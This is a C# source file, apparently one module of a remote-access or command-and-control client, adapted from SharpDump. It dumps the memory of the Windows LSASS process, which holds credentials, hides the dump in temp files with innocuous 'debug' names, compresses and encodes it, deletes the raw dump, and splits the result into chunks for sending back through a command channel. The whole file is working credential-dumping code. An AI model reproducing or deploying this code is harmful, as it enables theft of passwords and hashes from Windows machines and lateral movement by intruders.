using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO.Compression;
using System.Linq;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Text;
using System.Threading.Tasks;

namespace Client_side
{
    // Source from https://github.com/GhostPack/SharpDump/blob/master/SharpDump/Program.cs
    internal class MiniDumpHandler
    {
        [DllImport("dbghelp.dll", EntryPoint = "MiniDumpWriteDump", CallingConvention = CallingConvention.StdCall, CharSet = CharSet.Unicode, ExactSpelling = true, SetLastError = true)]
        static extern bool MiniDumpWriteDump(IntPtr hProcess, uint processId, SafeHandle hFile, uint dumpType, IntPtr expParam, IntPtr userStreamParam, IntPtr callbackParam);

        public static bool IsHighIntegrity()
        {
            // returns true if the current process is running with adminstrative privs in a high integrity context
            WindowsIdentity identity = WindowsIdentity.GetCurrent();
            WindowsPrincipal principal = new WindowsPrincipal(identity);
            return principal.IsInRole(WindowsBuiltInRole.Administrator);
        }

        public static string Compress(string inFile, string outFile)
        {
            try
            {
                if (File.Exists(outFile))
                {
                    File.Delete(outFile);
                }

                var bytes = File.ReadAllBytes(inFile);
                using (FileStream fs = new FileStream(outFile, FileMode.CreateNew))
                {
                    using (GZipStream zipStream = new GZipStream(fs, CompressionMode.Compress, false))
                    {
                        zipStream.Write(bytes, 0, bytes.Length);
                    }
                }
            }
            catch (Exception ex)
            {
                return ex.Message;
            }

            return "Compressed successfully!";
        }

        public static List<String> Minidump(int pid = -1)
        {
            IntPtr targetProcessHandle = IntPtr.Zero;
            uint targetProcessId = 0;

            Process targetProcess = null;
            if (pid == -1)
            {
                Process[] processes = Process.GetProcessesByName("lsass");
                targetProcess = processes[0];
            }
            else
            {
                try
                {
                    targetProcess = Process.GetProcessById(pid);
                }
                catch (Exception ex)
                {
                    // often errors if we can't get a handle to LSASS
                    return new List<String>() { ex.Message };
                }
            }

            if (targetProcess.ProcessName == "lsass" && !IsHighIntegrity())
            {
                return new List<String>() { "[-] Not running as admin, unable to dump lsass" };
            }

            try
            {
                targetProcessId = (uint)targetProcess.Id;
                targetProcessHandle = targetProcess.Handle;
            }
            catch (Exception ex)
            {
                return new List<String>() { ex.Message };
            }
            bool bRet = false;

            string tempPath = System.IO.Path.GetTempPath();
            string dumpFile = String.Format("{0}\\debug{1}.out", tempPath, targetProcessId);
            string zipFile = String.Format("{0}\\debug{1}.bin", tempPath, targetProcessId);


            using (FileStream fs = new FileStream(dumpFile, FileMode.Create, FileAccess.ReadWrite, FileShare.Write))
            {
                bRet = MiniDumpWriteDump(targetProcessHandle, targetProcessId, fs.SafeFileHandle, (uint)2, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero);
            }

            // if successful
            if (bRet)
            {
                string result = Compress(dumpFile, zipFile);
                if (result == "Compressed successfully!")
                {
                    File.Delete(dumpFile);
                    byte[] fileContent = File.ReadAllBytes(zipFile);
                    string fileContent64 = Encryptor.ConvertStr(fileContent);
                    List<String> chunks = new List<String>();
                    for (int i = 0; i < fileContent64.Length; i += HandleCommand.MaxChunkSize)
                    {
                        chunks.Add(fileContent64.Substring(i, Math.Min(HandleCommand.MaxChunkSize, fileContent64.Length - i)));
                    }

                    return chunks;
                }
                else
                {
                    File.Delete(dumpFile);
                    return new List<String>() { String.Format("[-] Error compressing dump: {0}", result) };
                }
            }
            else
            {
                return new List<String>() { "[-] Error dumping lsass" };
            }
        }
    }
}
